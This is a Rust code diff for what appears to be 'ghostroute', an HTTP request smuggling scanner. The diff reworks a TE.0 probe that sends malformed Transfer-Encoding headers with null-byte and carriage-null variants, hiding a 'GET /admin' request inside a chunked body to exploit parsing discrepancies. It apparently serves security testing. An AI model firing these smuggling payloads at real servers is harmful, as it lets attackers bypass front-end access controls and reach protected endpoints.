@@ -13,6 +13,7 @@ pub async fn probe(
     let baseline = h1::send_request(cfg, &baseline_req, auth).await?;
 
     // TE.0: inject null-byte or broken TE header to cause parsing discrepancy
+    // NOTE: te_bytes are built as raw bytes to preserve null bytes (String::from_utf8_lossy would strip them)
     let variants: Vec<(&str, Vec<u8>)> = vec![
         ("null-byte", b"Transfer-Encoding:\x00chunked".to_vec()),
         ("carriage-null", b"Transfer-Encoding:\r\n\x00chunked".to_vec()),
@@ -24,19 +25,22 @@ pub async fn probe(
     let mut second_status = 0u16;
 
     for (name, te_bytes) in &variants {
-        let te_val = String::from_utf8_lossy(te_bytes);
         let smuggled_req: &[u8] = b"GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n";
         let chunked_body = h1::build_chunked_body(&[smuggled_req]);
 
+        // Build request as raw bytes to preserve non-UTF-8 sequences (null bytes)
         let mut request = format!(
-            "POST / HTTP/1.1\r\nHost: {}\r\n{}\r\nUser-Agent: ghostroute/1.0.0\r\nConnection: keep-alive\r\nAccept: */*\r\n\r\n{}",
-            host, te_val, String::from_utf8_lossy(&chunked_body)
+            "POST / HTTP/1.1\r\nHost: {}\r\n",
+            host
+        ).into_bytes();
+        request.extend_from_slice(te_bytes);
+        request.extend_from_slice(
+            format!("\r\nUser-Agent: ghostroute/{}\r\nConnection: keep-alive\r\nAccept: */*\r\n\r\n", env!("CARGO_PKG_VERSION")).as_bytes()
         );
+        request.extend_from_slice(&chunked_body);
 
         if let Some(a) = auth {
-            let mut bytes = request.into_bytes();
-            a.apply_to_request(&mut bytes);
-            request = String::from_utf8(bytes).map_err(|e| e.to_string())?;
+            a.apply_to_request(&mut request);
         }
 
         use tokio::io::{AsyncReadExt, AsyncWriteExt};
@@ -48,7 +52,7 @@ pub async fn probe(
             Err(_) => continue,
         };
 
-        conn.write_all(request.as_bytes()).await.ok();
+        conn.write_all(&request).await.ok();
 
         let mut buf = Vec::with_capacity(4096);
         let mut tmp = [0u8; 8192];
